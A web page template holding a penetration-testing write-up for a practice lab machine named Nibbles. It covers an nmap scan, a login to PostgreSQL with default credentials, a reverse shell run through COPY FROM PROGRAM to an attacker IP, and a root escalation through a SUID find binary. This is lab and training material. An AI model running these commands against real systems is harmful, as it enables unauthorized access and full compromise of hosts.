@@ -1,0 +1,99 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">PG Practice : Nibbles</h1>
+    <p class="text">Difficulty : Intermediate | CommunityRating : Intermediate | MyRating : Easy</p>
+
+    <h2 class="subtitle">Enumeration</h2>
+    <div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/nibbles]
+└─$ sudo nmap -p- -sCV 192.168.156.47 --min-rate=10000
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-15 04:58 EST
+Nmap scan report for 192.168.156.47
+Host is up (0.17s latency).
+Not shown: 65530 filtered tcp ports (no-response)
+PORT    STATE  SERVICE      VERSION
+21/tcp  open   ftp          vsftpd 3.0.3
+22/tcp  open   ssh          OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 10:62:1f:f5:22:de:29:d4:24:96:a7:66:c3:64:b7:10 (RSA)
+|   256 c9:15:ff:cd:f3:97:ec:39:13:16:48:38:c5:58:d7:5f (ECDSA)
+|_  256 90:7c:a3:44:73:b4:b4:4c:e3:9c:71:d1:87:ba:ca:7b (ED25519)
+80/tcp  open   http         Apache httpd 2.4.38 ((Debian))
+|_http-server-header: Apache/2.4.38 (Debian)
+|_http-title: Enter a title, displayed at the top of the window.
+139/tcp closed netbios-ssn
+445/tcp closed microsoft-ds
+5437/tcp open  postgresql PostgreSQL DB 11.3 - 11.9
+|_ssl-date: TLS randomness does not represent time
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 26.63 seconds</code></pre></div>
+
+<p class="text">PostgreSQL is open on the target machine. It's possible that it can be accessed from remote host. Let's check it.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/nibbles]
+└─$ psql -U postgres -h 192.168.156.47 -p 5437
+Password for user postgres: 
+psql (18.1 (Debian 18.1-1), server 11.7 (Debian 11.7-0+deb10u1))
+SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, compression: off, ALPN: none)
+Type "help" for help.
+
+postgres=#</code></pre></div>
+<p class="text">It accesspted default password : <u>postgres : postgres</u>.</p>
+
+<p class="text">Since I accessed to postgreSQL with postgres user, we would have high privilege which provides us to execute shell code.</p>
+<p class="text">To execute reverse shell command, I input codes below:</p>
+<div class="code-box"><pre><code>DROP TABLE IF EXISTS cmd_exec;
+
+CREATE TABLE cmd_exec(cmd_output text);
+
+COPY cmd_exec FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/192.168.45.230/21 0>&1"';
+
+SELECT * FROM cmd_exec;</code></pre></div>
+<p class="text">Since the target filters ports like 443, 4444 somehow, I used open port 21 which is used by ftp.</p>
+<p class="text">Though port 21 is used by ftp, OS does not limit its usage. Therefore, we can get revshell from port 21 where is allowed to transmit data.</p>
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/nibbles]
+└─$ rlwrap nc -lvnp 21  
+listening on [any] 21 ...
+connect to [192.168.45.230] from (UNKNOWN) [192.168.156.47] 40290
+bash: cannot set terminal process group (1481): Inappropriate ioctl for device
+bash: no job control in this shell
+postgres@nibbles:/var/lib/postgresql/11/main$</code></pre></div>
+
+<p class="text">I got postgres user shell.</p>
+
+
+<h2 class="subtitle">PrivEsc</h2>
+<p class="text">There is interesting SUID binary : FIND</p>
+<div class="code-box"><pre><code>postgres@nibbles:/var/lib/postgresql/11/main$ find / -perm -4000 2>/dev/null
+find / -perm -4000 2>/dev/null
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/bin/chfn
+/usr/bin/passwd
+/usr/bin/gpasswd
+/usr/bin/chsh
+/usr/bin/fusermount
+/usr/bin/newgrp
+/usr/bin/su
+/usr/bin/mount
+/usr/bin/find
+/usr/bin/sudo
+/usr/bin/umount</code></pre></div>
+
+<p class="text">postgres@nibbles:/tmp$ find . -exec /bin/sh -p \; -quit
+find . -exec /bin/sh -p \; -quit
+id
+uid=106(postgres) gid=113(postgres) euid=0(root) groups=113(postgres),112(ssl-cert)</p>
+<p class="text">I could get root euid.</p>
+
+</body>
+</html>
